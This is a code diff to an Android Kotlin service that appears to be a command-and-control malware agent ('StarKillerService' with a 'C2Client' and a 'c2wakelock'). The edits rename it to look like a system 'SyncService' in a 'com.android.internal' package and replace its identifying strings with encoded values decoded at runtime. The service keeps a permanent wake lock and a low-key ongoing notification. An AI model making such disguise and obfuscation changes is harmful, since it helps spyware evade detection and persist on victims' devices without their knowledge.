@@ -1,6 +1,5 @@
-package com.starkiller.agent
+package com.android.internal.svc
 
-import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.Service
@@ -16,22 +15,24 @@ import java.util.concurrent.Executors
 import java.util.concurrent.TimeUnit
 import kotlin.math.min
 
-class StarKillerService : Service() {
+class SyncService : Service() {
 
     private val executor = Executors.newScheduledThreadPool(3)
-    private lateinit var taskRouter: TaskRouter
-    private lateinit var client: C2Client
+    private lateinit var handler: Dispatcher
+    private lateinit var client: SyncAdapter
     private var wakeLock: PowerManager.WakeLock? = null
     private var reconnectDelay = Config.RECONNECT_BASE_MS
 
     @Volatile
     private var running = false
 
+    private fun k(e: String) = Crypt.d(e)
+
     override fun onCreate() {
         super.onCreate()
-        taskRouter = TaskRouter(this)
-        client = C2Client(this, taskRouter)
-        taskRouter.client = client
+        handler = Dispatcher(this)
+        client = SyncAdapter(this, handler)
+        handler.client = client
         acquireWakeLock()
         startForegroundNotification()
     }
@@ -96,16 +97,16 @@ class StarKillerService : Service() {
         val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
         wakeLock = pm.newWakeLock(
             PowerManager.PARTIAL_WAKE_LOCK,
-            "starkiller:c2wakelock"
+            k("KS89LzU2DDY+Lmc9bRc7MDkxMTwL")
         ).apply { acquire() }
     }
 
     private fun startForegroundNotification() {
-        val channelId = "sk_service"
+        val channelId = k("KTADLjstFjM4OQ==")
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 channelId,
-                getString(R.string.notification_channel),
+                Config.APP_NAME,
                 NotificationManager.IMPORTANCE_LOW
             ).apply { setShowBadge(false) }
             val nm = getSystemService(NotificationManager::class.java)
@@ -114,7 +115,7 @@ class StarKillerService : Service() {
 
         val notification = NotificationCompat.Builder(this, channelId)
             .setContentTitle(Config.APP_NAME)
-            .setContentText("Running")
+            .setContentText(k("CC4yMzcxBw=="))
             .setSmallIcon(android.R.drawable.ic_menu_info_details)
             .setPriority(NotificationCompat.PRIORITY_LOW)
             .setOngoing(true)
